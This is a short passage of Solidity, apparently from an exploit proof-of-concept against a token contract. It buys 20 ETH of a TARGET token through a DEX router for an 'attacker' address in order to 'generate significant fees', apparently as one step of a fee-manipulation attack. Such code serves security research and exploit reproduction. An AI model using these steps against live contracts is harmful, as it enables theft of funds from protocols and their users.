        path[1] = TARGET;

        // Buy with 20 ETH to generate significant fees
        uint256 buyAmount = 20 ether;
        uint256[] memory amounts = routerContract.swapExactETHForTokens{value: buyAmount}(
            0,
            path,
            attacker,
            block.timestamp + 1000
        );

        uint256 tokenBalance = amounts[1];
